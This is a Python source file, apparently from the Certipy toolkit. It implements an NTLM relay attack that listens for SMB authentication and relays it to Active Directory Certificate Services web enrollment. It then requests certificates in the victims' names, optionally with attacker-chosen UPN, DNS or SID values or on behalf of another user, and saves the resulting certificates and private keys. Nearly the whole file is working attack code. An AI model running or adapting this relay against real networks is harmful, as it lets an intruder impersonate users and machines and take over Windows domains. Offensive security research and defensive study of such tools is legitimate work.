import argparse
import base64
import os
import re
import time
import traceback
import urllib.parse
from struct import unpack
from threading import Lock

from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallengeResponse
from impacket.spnego import SPNEGO_NegTokenResp

from certipy.lib.certificate import (
    cert_id_to_parts,
    cert_to_pem,
    create_csr,
    create_pfx,
    create_on_behalf_of,
    csr_to_pem,
    csr_to_der,
    der_to_csr,
    der_to_pem,
    get_identifications_from_certificate,
    get_object_sid_from_certificate,
    key_to_pem,
    load_pfx,
    pem_to_cert,
    pem_to_key,
    rsa,
    x509,
)
from certipy.lib.errors import translate_error_code
from certipy.lib.formatting import print_certificate_identifications
from certipy.lib.logger import logging

try:
    from http.client import HTTPConnection
except ImportError:
    from httplib import HTTPConnection


class ADCSRelayServer(HTTPRelayClient):
    def initConnection(self):
        logging.debug("Connecting to %s:%s..." % (self.targetHost, self.targetPort))
        self.session = HTTPConnection(
            self.targetHost, self.targetPort, timeout=self.adcs_relay.timeout
        )
        self.session.connect()
        logging.debug("Connected to %s:%s" % (self.targetHost, self.targetPort))
        self.lastresult = None
        if self.target.path == "":
            self.path = "/"
        else:
            self.path = self.target.path
        return True

    def sendAuth(self, *args, **kwargs):
        self.adcs_relay.attack_lock.acquire()
        try:
            response = self._sendAuth(*args, **kwargs)
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
            response = None, STATUS_ACCESS_DENIED
        finally:
            self.adcs_relay.attack_lock.release()
            return response

    def _sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if (
            unpack("B", authenticateMessageBlob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2["ResponseToken"]
        else:
            token = authenticateMessageBlob

        try:
            response = NTLMAuthChallengeResponse()
            response.fromString(data=token)

            domain = response["domain_name"].decode("utf-16le")
            username = response["user_name"].decode("utf-16le")

            self.session.user = "%s\\%s" % (domain, username)

            auth = base64.b64encode(token).decode("ascii")
            headers = {"Authorization": "%s %s" % (self.authenticationMethod, auth)}
            self.session.request("GET", self.path, headers=headers)
            res = self.session.getresponse()

            if res.status == 401:
                logging.error("Got unauthorized response from AD CS")
                return None, STATUS_ACCESS_DENIED
            else:
                logging.debug(
                    "HTTP server returned error code %d, treating as a successful login"
                    % res.status
                )
                # Cache this
                self.lastresult = res.read()
                return None, STATUS_SUCCESS
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")


class ADCSAttackClient(ProtocolAttack):
    def run(self):
        self.adcs_relay.attack_lock.acquire()
        try:
            self._run()
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
        finally:
            self.adcs_relay.attack_lock.release()

    def _run(self):
        if (
            not self.adcs_relay.no_skip
            and self.client.user in self.adcs_relay.attacked_targets
        ):
            logging.debug(
                "Skipping user %s since attack was already performed"
                % repr(self.client.user)
            )
            return

        request_id = self.adcs_relay.request_id
        if request_id:
            self.client.request("GET", "/certsrv/certnew.cer?ReqID=%d" % request_id)

            response = self.client.getresponse()
            content = response.read()

            if response.status != 200:
                logging.error("Got error while requesting certificate")
                if self.adcs_relay.verbose:
                    logging.warning("Got error while trying to request certificate:")
                    print(content)
                else:
                    logging.warning(
                        "Got error while trying to request certificate. Use -debug to print the response"
                    )
                return

            if b"BEGIN CERTIFICATE" in content:
                cert = pem_to_cert(content)
            else:
                content = content.decode()
                if "Taken Under Submission" in content:
                    logging.warning("Certificate request is still pending approval")
                elif "The requested property value is empty" in content:
                    logging.warning("Unknown request ID %d" % request_id)
                else:
                    error_code = re.findall(r" (0x[0-9a-fA-F]+) \(", content)
                    try:
                        error_code = int(error_code[0], 16)
                        msg = translate_error_code(error_code)
                        logging.warning("Got error from AD CS: %s" % msg)
                    except:
                        logging.warning("Got unknown error from AD CS:")
                        if self.adcs_relay.verbose:
                            print(content)
                        else:
                            logging.warning("Use -debug to print the response")

                return self.finish_run()

            return self.save_certificate(cert, request_id=request_id)

        template = self.config.template

        if template is None:
            template = "Machine" if self.username.endswith("$") else "User"

        if self.adcs_relay.on_behalf_of:
            self.username = self.adcs_relay.on_behalf_of
            if self.adcs_relay.on_behalf_of.count("\\") > 0:
                parts = self.username.split("\\")
                username = "\\".join(parts[1:])
                domain = parts[0]
                if "." in domain:
                    logging.warning(
                        "Domain part of '-on-behalf-of' should not be a FQDN"
                        )

        csr, key = create_csr(
            self.username,
            alt_dns=self.adcs_relay.dns,
            alt_upn=self.adcs_relay.upn,
            sid=self.adcs_relay.sid,
            key_size=self.adcs_relay.key_size,
        )

        if self.adcs_relay.sid:
            csr = der_to_csr(csr)

        if self.adcs_relay.on_behalf_of:
            if self.adcs_relay.pfx is None:
                logging.error(
                    "A certificate and private key (-pfx) is required in order to request on behalf of another user"
                )
                return False

            csr = csr_to_der(csr)
            with open(self.adcs_relay.pfx, "rb") as f:
                agent_key, agent_cert = load_pfx(f.read())

            csr = create_on_behalf_of(csr, self.adcs_relay.on_behalf_of, agent_cert, agent_key)
            csr = der_to_pem(csr, "CERTIFICATE REQUEST")

        else:
            csr = csr_to_pem(csr).decode()
        
        attributes = ["CertificateTemplate:%s" % template]

        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
            san = []
            if self.adcs_relay.dns:
                san.append("dns=%s" % self.adcs_relay.dns)
            if self.adcs_relay.upn:
                san.append("upn=%s" % self.adcs_relay.upn)

            attributes.append("SAN:%s" % "&".join(san))

        attributes = "\n".join(attributes)

        params = {
            "Mode": "newreq",
            "CertAttrib": attributes,
            "CertRequest": csr,
            "TargetStoreFlags": "0",
            "SaveCert": "yes",
            "ThumbPrint": "",
        }

        data = urllib.parse.urlencode(params)

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data),
        }

        logging.info(
            "Requesting certificate for %s based on the template %s"
            % (repr(self.client.user), repr(template))
        )

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        response = self.client.getresponse()
        content = response.read().decode()

        if response.status != 200:
            logging.error("Got error while requesting certificate")
            if self.adcs_relay.verbose:
                print(content)
            else:
                logging.warning("Use -debug to print the response")
            return

        request_id = re.findall(r"certnew.cer\?ReqID=([0-9]+)&", content)
        if not request_id:
            if "template that is not supported" in content:
                logging.error("Template %s is not supported by AD CS" % repr(template))
                return
            else:
                if "Certificate Pending" in content:
                    logging.warning("Certificate request is pending approval")
                elif '"Denied by Policy Module"' in content:
                    logging.warning(
                        "Got access denied while trying to enroll in template %s"
                        % repr(template)
                    )
                else:
                    error_code = re.findall(
                        r"Denied by Policy Module  (0x[0-9a-fA-F]+),", content
                    )
                    try:
                        error_code = int(error_code[0], 16)
                        msg = translate_error_code(error_code)
                        logging.warning("Got error from AD CS: %s" % msg)
                    except:
                        logging.warning("Got unknown error from AD CS:")
                        if self.adcs_relay.verbose:
                            print(content)
                        else:
                            logging.warning("Use -debug to print the response")

            request_id = re.findall(r"Your Request Id is ([0-9]+)", content)
            if len(request_id) != 1:
                logging.error("Failed to get request id from response")
                return

            request_id = int(request_id[0])

            logging.info("Request ID is %d" % request_id)

            should_save = input(
                "Would you like to save the private key? (y/N) "
            ).rstrip("\n")

            if should_save.lower() == "y":
                with open("%d.key" % request_id, "wb") as f:
                    f.write(key_to_pem(key))

                logging.info("Saved private key to %d.key" % request_id)

            return self.finish_run()

        if len(request_id) == 0:
            logging.error("Failed to get request id from response")
            return

        request_id = int(request_id[0])

        self.client.request("GET", "/certsrv/certnew.cer?ReqID=%d" % request_id)
        response = self.client.getresponse()

        content = response.read()
        cert = pem_to_cert(content)

        return self.save_certificate(cert, key=key, request_id=request_id)

    def finish_run(self):
        self.adcs_relay.attacked_targets.append(self.client.user)
        if not self.adcs_relay.forever:
            self.adcs_relay.shutdown()

    def save_certificate(
        self,
        cert: x509.Certificate,
        key: rsa.RSAPrivateKey = None,
        request_id: int = None,
    ):
        identifications = get_identifications_from_certificate(cert)

        print_certificate_identifications(identifications)

        object_sid = get_object_sid_from_certificate(cert)
        if object_sid is not None:
            logging.info("Certificate object SID is %s" % repr(object_sid))
        else:
            logging.info("Certificate has no object SID")

        out = self.adcs_relay.out
        if out is None:
            out, _ = cert_id_to_parts(identifications)
            if out is None:
                out = str(request_id)

            out = out.rstrip("$").lower()

        if key is None:
            try:
                with open("%d.key" % request_id, "rb") as f:
                    key = pem_to_key(f.read())
            except Exception as e:
                logging.warning(
                    "Could not find matching private key. Saving certificate as PEM"
                )
                with open("%s.crt" % out, "wb") as f:
                    f.write(cert_to_pem(cert))

                logging.info("Saved certificate to %s" % repr("%s.crt" % out))
            else:
                logging.info("Loaded private key from %s" % repr("%d.key" % request_id))
                pfx = create_pfx(key, cert)
                with open("%s.pfx" % out, "wb") as f:
                    f.write(pfx)
                logging.info(
                    "Saved certificate and private key to %s" % repr("%s.pfx" % out)
                )
        else:
            pfx = create_pfx(key, cert)

            with open("%s.pfx" % out, "wb") as f:
                f.write(pfx)

                logging.info(
                    "Saved certificate and private key to %s" % repr("%s.pfx" % out)
                )

        self.finish_run()


class Relay:
    def __init__(
        self,
        ca,
        template=None,
        upn=None,
        dns=None,
        extensionsid: str=None,
        retrieve=None,
        on_behalf_of: str = None,
        pfx: str = None,
        key_size: int = 2048,
        out=None,
        interface="0.0.0.0",
        port=445,
        forever=False,
        no_skip=False,
        timeout=5,
        debug=False,
        **kwargs
    ):
        self.ca = ca
        self.template = template
        self.upn = upn
        self.dns = dns
        self.sid = extensionsid
        self.request_id = int(retrieve)
        self.on_behalf_of = on_behalf_of
        self.pfx = pfx
        self.key_size = key_size
        self.out = out
        self.forever = forever
        self.no_skip = no_skip
        self.timeout = timeout
        self.verbose = debug
        self.interface = interface
        self.port = port
        self.kwargs = kwargs

        self.attacked_targets = []
        self.attack_lock = Lock()

        target = "http://%s/certsrv/certfnsh.asp" % ca
        logging.info("Targeting %s" % target)

        target = TargetsProcessor(
            singleTarget=target,
        )

        config = NTLMRelayxConfig()
        config.setTargets(target)
        config.setIsADCSAttack(True)
        config.setADCSOptions(self.template)
        config.setAttacks({"HTTP": self.get_attack_client})
        config.setProtocolClients({"HTTP": self.get_relay_server})
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")

        self.server = SMBRelayServer(config)

    def start(self):
        logging.info("Listening on %s:%d" % (self.interface, self.port))

        self.server.start()

        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("")
            self.shutdown()
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")

    def get_relay_server(self, *args, **kwargs) -> ADCSRelayServer:
        relay_server = ADCSRelayServer(*args, **kwargs)
        relay_server.adcs_relay = self
        return relay_server

    def get_attack_client(self, *args, **kwargs) -> ADCSAttackClient:
        attack_client = ADCSAttackClient(*args, **kwargs)
        attack_client.adcs_relay = self
        return attack_client

    def shutdown(self):
        logging.info("Exiting...")
        os._exit(0)


def entry(options: argparse.Namespace) -> None:
    relay = Relay(**vars(options))
    relay.start()
